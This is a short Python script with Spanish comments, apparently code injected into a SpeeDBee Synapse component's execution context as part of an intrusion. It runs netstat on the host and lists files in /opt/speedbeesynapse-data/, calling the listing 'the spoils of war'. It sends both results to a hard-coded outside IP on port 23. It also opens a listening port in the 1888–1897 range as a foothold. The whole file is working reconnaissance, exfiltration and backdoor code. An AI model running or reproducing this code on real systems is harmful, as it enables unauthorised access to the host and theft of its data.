# broker_executor.py - VERSIÓN 017 (AUTO-PORT & FULL CONSOLE)
import threading
import socket
import subprocess
import os

MI_PC = "192.168.171.156"

def consola_total(comp, ip_dest):
    import socket
    import time

    def log_h(msg):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip_dest, 23))
            s.sendall(f"DX1_LOG_017: {msg}\n".encode())
            s.close()
        except: pass

    log_h("--- SESIÓN 017: LIMPIEZA Y ESCANEO ---")
    
    # 1. ¿Quién nos está bloqueando? (Netstat al Hércules)
    try:
        net = subprocess.check_output("netstat -plnt", shell=True).decode()
        log_h(f"PUERTOS OCUPADOS ACTUALMENTE:\n{net}")
    except:
        log_h("No se pudo ejecutar netstat.")

    # 2. Intentar abrir un puerto libre (1888, 1889, 1890...)
    puerto_base = 1888
    server = None
    for p in range(puerto_base, puerto_base + 10):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', p))
            server.listen(1)
            log_h(f"!!! ÉXITO: Escuchando en el puerto {p} !!!")
            break
        except:
            log_h(f"Puerto {p} ocupado, probando el siguiente...")
            server.close()

    # 3. Listar archivos (El botín de guerra)
    try:
        path = "/opt/speedbeesynapse-data/"
        files = os.listdir(path)
        log_h(f"ARCHIVOS EN DATA: {files}")
    except Exception as e:
        log_h(f"Error archivos: {e}")

    # 4. Mantener el bucle vivo para recibir conexiones
    if server:
        while True:
            try:
                conn, addr = server.accept()
                log_h(f"ALGUIEN CONECTÓ DESDE {addr}")
                conn.close()
            except: pass

# Lanzamos el hilo
t = threading.Thread(target=consola_total, args=(self, MI_PC), daemon=True)
t.start()
self.col_res.insert("LOG 017: Consola Activa")